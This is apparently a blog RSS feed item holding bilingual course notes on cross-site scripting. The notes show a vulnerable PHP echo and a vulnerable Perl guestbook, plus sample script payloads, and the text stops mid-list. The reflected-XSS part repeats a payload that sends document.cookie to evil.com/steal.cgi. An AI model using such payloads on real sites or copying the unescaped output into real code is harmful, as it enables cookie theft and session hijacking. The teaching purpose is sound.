<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title> • Posts by &#34;software security&#34; tag</title>
        <link>http://example.com</link>
        <description>🌸</description>
        <language>zh-CN</language>
        <pubDate>Wed, 30 Oct 2024 22:31:43 +1000</pubDate>
        <lastBuildDate>Wed, 30 Oct 2024 22:31:43 +1000</lastBuildDate>
        <category>C</category>
        <category>software security</category>
        <category>AFL</category>
        <category>Linux</category>
        <category>C language</category>
        <category>HTTP</category>
        <category>XSS</category>
        <category>CSRF</category>
        <category>vulnerability</category>
        <category>OSI</category>
        <category>TCP/IP</category>
        <category>network system</category>
        <category>SQL</category>
        <category>gdb</category>
        <category>JavaScript</category>
        <category>Blog</category>
        <category>日常</category>
        <item>
            <guid isPermalink="true">http://example.com/course/Cross-Site-attack/</guid>
            <title>Cross-Site attack</title>
            <link>http://example.com/course/Cross-Site-attack/</link>
            <category>software security</category>
            <category>HTTP</category>
            <category>XSS</category>
            <category>CSRF</category>
            <pubDate>Wed, 30 Oct 2024 22:31:43 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Cross-Site Scripting&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Scripting&#34;&gt;#&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;
&lt;h2 id=&#34;XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS&#34;&gt;#&lt;/a&gt;XSS&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Cross-Site Scripting (XSS)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Causes arbitrary code to run in a browser that is connected to a trusted Web site
&lt;ul&gt;
&lt;li&gt;May occur when code returns HTML output that makes use of user inputs&lt;/li&gt;
&lt;li&gt;Trick users into clicking a hyperlink from outside the site&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacks allows:
&lt;ul&gt;
&lt;li&gt;Disclosure of user files&lt;/li&gt;
&lt;li&gt;Installation of Trojans&lt;/li&gt;
&lt;li&gt;Redirection to other pages&lt;/li&gt;
&lt;li&gt;Trivial theft of cookies&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Basic Problem: Echoing Untrusted User Input&lt;br&gt;
Classic mistake in a server-side application with URL  &lt;code&gt;http://naive.com/search.php?term=justin+bieber&lt;/code&gt; &lt;br&gt;
PHP at search.php responds with&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Search results&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   You have searched for &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;?php echo $_GET[&amp;#x27;term&amp;#x27;] ?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ...  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里， &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  的内容直接被嵌入到 HTML 中进行回显。如果  &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Dangerous HTML Inputs&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会在页面中添加一个  &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;  标签，显示攻击者可以更改网页内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location=&#39;http://google.com&#39;&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Main Types of Cross-Site Scripting Attacks
&lt;ol&gt;
&lt;li&gt;Stored (persistent)&lt;/li&gt;
&lt;li&gt;Reflected (non-persistent)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Stored (Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored (Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Stored (Persistent) XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Data supplied by an attacker is &lt;strong&gt;permanently stored&lt;/strong&gt; on a server and displayed to other users when browsing without being properly sanitised&lt;br&gt;
If the user input is displayed in the page
&lt;ul&gt;
&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
&lt;li&gt;For the current user or other users&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67222f628055d.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example Vulnerable Guestbook Program&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!perl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Fig. 19.6: fig19_06.pl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Guestbook program.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; warnings;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; strict;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; CGI &lt;span class=&#34;string&#34;&gt;qw( :standard )&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( header(), start_html( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ), h1( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( param() ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; h3( &lt;span class=&#34;string&#34;&gt;&amp;quot;Thank you for signing our guestbook!!!&amp;quot;&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt;guestbook.log&amp;quot;&lt;/span&gt; ) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;   //Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, hr(), &lt;span class=&#34;string&#34;&gt;&amp;quot;From: &amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       a( &amp;#123; &lt;span class=&#34;string&#34;&gt;-href =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mailto:&lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt;&amp;quot;&lt;/span&gt; &amp;#125;, &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; ), br(), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; );    &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt; Store the user entered data in the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;guestbook.log&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );   &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &amp;lt;FILE&amp;gt; );      &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Display the contents of the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( h4( &lt;span class=&#34;string&#34;&gt;&amp;quot;Please sign our guestbook:&amp;quot;&lt;/span&gt; ), start_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;E-mail: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your message:&amp;quot;&lt;/span&gt;, br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     textarea( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-rows =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-columns =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-wrap =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     br(), submit( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sign the Guestbook&amp;quot;&lt;/span&gt; ), end_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     end_html() );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。
&lt;ul&gt;
&lt;li&gt;例如，用户在  &lt;code&gt;name&lt;/code&gt;  或  &lt;code&gt;message&lt;/code&gt;  输入字段中插入  &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; ，这段恶意代码将会在其他用户查看留言簿时被执行。&lt;/li&gt;
&lt;li&gt;或是在留言时插入 HTML 改变页面布局&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日志文件的可写性：&lt;br&gt;
程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340e28890.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png&#34; alt=&#34;Image 1&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png&#34; alt=&#34;Image 2&#34;&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;h2 id=&#34;Reflected (Non-Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Reflected (Non-Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Reflected (Non-Persistent) XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Data supplied by an attacker is displayed in the response page &lt;strong&gt;without being stored on a server&lt;/strong&gt;&lt;br&gt;
If the user input is displayed in the page
&lt;ul&gt;
&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
&lt;li&gt;For only the current user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672236eb773d1.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;恶意网页（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwuY29t&#34;&gt;evil.com&lt;/span&gt;）&lt;br&gt;
攻击者在  &lt;code&gt;evil.com&lt;/code&gt;  上创建了一个包含恶意代码的网页。&lt;br&gt;
页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://naive.com/hello.cgi?name=&amp;lt;script&amp;gt;win.open(&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27; + document.cookie)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;链接中的  &lt;code&gt;name&lt;/code&gt;  参数是用来注入 JavaScript 代码的。代码试图将用户的  &lt;code&gt;cookie&lt;/code&gt;  信息发送到攻击者的服务器（即  &lt;code&gt;evil.com&lt;/code&gt;  的  &lt;code&gt;steal.cgi&lt;/code&gt;  脚本）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;受害者点击了恶意链接并访问了目标网页。&lt;br&gt;
浏览器向 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 发送请求，其中包含了恶意的 name 参数。请求的样式为：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; /hello.&lt;span class=&#34;property&#34;&gt;cgi&lt;/span&gt;?name=&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;目标网站（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt;）&lt;br&gt;
目标网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25haXZlLmNvbQ==&#34;&gt;naive.com&lt;/span&gt; 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, dear &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;. Welcome!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于未对输入进行过滤，浏览器将  &lt;code&gt;script&lt;/code&gt;  标签作为普通的 JavaScript 代码执行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结果
&lt;ul&gt;
&lt;li&gt;浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  &lt;code&gt;evil.com/steal.cgi&lt;/code&gt;  发送了用户的  &lt;code&gt;cookie&lt;/code&gt;  信息。&lt;/li&gt;
&lt;li&gt;攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。&lt;/li&gt;
&lt;li&gt;违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Reflected XSS Attack Details&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;User is tricked into visiting an honest website&lt;/li&gt;
&lt;li&gt;Bug in website code causes user’s browser to execute an arbitrary attack script
&lt;ul&gt;
&lt;li&gt;The origin of this script is now the website itself&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Script can request sensitive data, control form fields on this page and linked pages
&lt;ul&gt;
&lt;li&gt;Can cause user’s browser to attack other websites&lt;br&gt;
